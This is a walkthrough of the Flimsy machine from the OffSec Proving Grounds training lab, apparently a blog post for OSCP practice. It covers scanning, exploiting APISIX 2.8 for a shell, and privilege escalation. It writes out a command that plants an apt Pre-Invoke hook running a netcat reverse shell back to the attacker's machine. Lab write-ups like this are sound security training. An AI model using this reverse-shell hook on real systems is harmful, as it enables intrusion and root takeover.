---
title: Flimsy from Proving Grounds
description: This is a walkthrough of the flimsy machine that can be found in
  offsec's Proving Grounds.  This machine is generally used for training for
  pentest certification exams, such as offsec's OSCP
author: CyberOperator
date: 2024-07-23T20:40:53.707Z
tags:
  - Exploitable
---
# Walk-through of Flimsy

Note: This walkthrough assumes that you are using a Kali Linux (or a comparable machine with the enumerated tools included) and have access to Flimsy's IP address (via local network or VPN).  This machine is considered as "easy" and is a good way to practice exploitation techniques.

![](/static/img/screenshot-2024-07-23-at-4.49.06 pm.png "Flimsy's IP address")

As usual the first step is to scan the machine.  We'll use nmap:

## 1. NMAP scan:

We'll do a quick scan first to see which ports are open and a more involved scan that includes version scan as well as initial vulnerability detection:

Quick Scan:

![](/static/img/screenshot-2024-07-23-at-4.53.38 pm.png)

Shows some open ports which may give you an idea of what to look for.  Here we can see right away that there is a web server, mysql, etc.  This may be useful.  Let's visit the site on the browser to see if there is anything interesting.

We see a web app that also includes a user input field, this may be interesting ...

![](/static/img/screenshot-2024-07-23-at-4.58.19 pm.png)

Now we can go back and take a look at the full nmap scan:

![](/static/img/screenshot-2024-07-23-at-5.10.02 pm.png)

![](/static/img/screenshot-2024-07-23-at-5.11.15 pm.png)

## 2. Exploit

We can see a couple of interesting potential vulnerabilities and attack vectors.  You can play around searching for various exploits, but for our purposes, let's focus on the open portn number 43500 (APISIX 2.8).  We can start by searching for an exploit:

![](/static/img/screenshot-2024-07-23-at-5.14.28 pm.png)

There it is, let's stay on searchsploit and download the exploit code to our local machine:

![](/static/img/screenshot-2024-07-23-at-5.16.01 pm.png)

Now let's run the exploit (if you have questions about how to format the exploit, whether you need to change any parts of the exploit code and the parameters, simply go to the Exploit-DB web site and review it there).  Sometimes you can just try to do a first pass at the exploit and get what you need such as here, where the exploit gives us usage instructions:

![](/static/img/screenshot-2024-07-23-at-5.20.00 pm.png)

Now we start a listener on our Kali attack machine and enter the correct parameters:

![](/static/img/screenshot-2024-07-23-at-5.23.49 pm.png)

And we get a connection to our kali listener:

![](/static/img/screenshot-2024-07-23-at-5.28.49 pm.png)

We are now in the user *franklin* account

![](/static/img/screenshot-2024-07-23-at-5.30.13 pm.png)

This is not the most intuitive (or useful) shell, so let's use

`python3 -c 'import pty; pty.spawn("/bin/bash")' `

to get a better shell:

![](/static/img/screenshot-2024-07-23-at-5.36.35 pm.png)

This is not a privileged account, so time to escalate privileges.

## 3. Privilege Escalation

From our scan, we know that this is a Linux machine so why not see if we can tie into a privileged cron job, first let's see what we have:



![](/static/img/screenshot-2024-07-23-at-5.38.58 pm.png)

Looks very promising, can we send a reverse shell now?  Let's start by opening another listener that we can send our privilege request to connect to:

![](/static/img/screenshot-2024-07-23-at-5.42.58 pm.png)

And send in our reverse shell "request" to the update cron!

First, we move to the correct directory:

`cd /etc/apt/apt.conf.d/`

Then we send our shell request to our kali machine:

`echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.54 2222 >/tmp/f"};' > shell`

When we go back to our listener on the Kali machine, we got a connection! 

![](/static/img/screenshot-2024-07-23-at-5.56.29 pm.png)

## 4. Get The Flag!

And we are set with the root flag!

![](/static/img/screenshot-2024-07-23-at-5.58.01 pm.png)

I hope you found this walkthrough helpful.  Now go back and do it yourself without looking at this to verify that you learned!